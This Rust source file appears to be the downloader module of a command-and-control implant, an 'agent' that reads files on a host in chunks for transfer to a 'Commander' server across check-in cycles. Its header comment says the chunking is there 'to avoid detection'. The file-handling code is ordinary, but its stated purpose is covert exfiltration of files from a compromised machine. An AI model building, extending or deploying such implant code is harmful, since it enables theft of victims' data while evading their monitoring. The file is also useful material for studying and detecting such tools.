// __NAME__ Agent — Downloader
//
// Manages chunked file downloads (agent → server). Large files are split
// into chunks and sent across multiple check-in cycles to avoid detection
// and memory pressure.
//
// Flow:
//   1. Commander calls start() with path → allocates DownloadState, returns ID
//   2. Agent loop calls read_chunk() once per tick → reads next chunk
//   3. Server ACKs each chunk → agent sends next
//   4. When file is fully sent, finish() cleans up

#![allow(dead_code)]

use std::fs::File;
use std::io::Read;

// ── Download states ────────────────────────────────────────────────────────────

pub const DL_STATE_IDLE: u32     = 0;
pub const DL_STATE_SENDING: u32  = 1;
pub const DL_STATE_FINISHED: u32 = 2;
pub const DL_STATE_ERROR: u32    = 3;

const DEFAULT_CHUNK_SIZE: usize = 100 * 1024; // 100 KB

// ── Download entry ─────────────────────────────────────────────────────────────

pub struct DownloadState {
    pub download_id: u32,
    pub state: u32,
    pub file_path: String,
    pub chunk_size: usize,
    pub total_size: usize,
    pub bytes_sent: usize,
    file: Option<File>,
}

// ── Downloader ─────────────────────────────────────────────────────────────────

pub struct Downloader {
    downloads: Vec<DownloadState>,
    next_id: u32,
}

impl Downloader {
    pub fn new() -> Self {
        Downloader {
            downloads: Vec::new(),
            next_id: 1,
        }
    }

    /// Start a new chunked download. Returns download ID, or 0 on failure.
    pub fn start(&mut self, file_path: &str, chunk_size: usize) -> u32 {
        let f = match File::open(file_path) {
            Ok(f) => f,
            Err(_) => return 0,
        };
        let total = f.metadata().map(|m| m.len() as usize).unwrap_or(0);
        let cs = if chunk_size == 0 { DEFAULT_CHUNK_SIZE } else { chunk_size };
        let id = self.next_id;
        self.next_id += 1;
        self.downloads.push(DownloadState {
            download_id: id,
            state: DL_STATE_SENDING,
            file_path: file_path.to_string(),
            chunk_size: cs,
            total_size: total,
            bytes_sent: 0,
            file: Some(f),
        });
        id
    }

    /// Read the next chunk for a download.
    pub fn read_chunk(&mut self, download_id: u32) -> Option<Vec<u8>> {
        let dl = self.downloads.iter_mut().find(|d| d.download_id == download_id)?;
        if dl.state != DL_STATE_SENDING {
            return None;
        }
        let f = dl.file.as_mut()?;
        let mut buf = vec![0u8; dl.chunk_size];
        let n = f.read(&mut buf).ok()?;
        if n == 0 {
            dl.state = DL_STATE_FINISHED;
            dl.file = None;
            return None;
        }
        buf.truncate(n);
        dl.bytes_sent += n;
        if dl.bytes_sent >= dl.total_size {
            dl.state = DL_STATE_FINISHED;
            dl.file = None;
        }
        Some(buf)
    }

    /// Mark a download as finished and release resources.
    pub fn finish(&mut self, download_id: u32) -> bool {
        if let Some(dl) = self.downloads.iter_mut().find(|d| d.download_id == download_id) {
            dl.state = DL_STATE_FINISHED;
            dl.file = None;
            true
        } else {
            false
        }
    }

    /// Cancel and clean up a download.
    pub fn cancel(&mut self, download_id: u32) -> bool {
        if let Some(pos) = self.downloads.iter().position(|d| d.download_id == download_id) {
            self.downloads.swap_remove(pos);
            true
        } else {
            false
        }
    }

    /// Get count of active downloads.
    pub fn active_count(&self) -> usize {
        self.downloads.iter().filter(|d| d.state == DL_STATE_SENDING).count()
    }
}
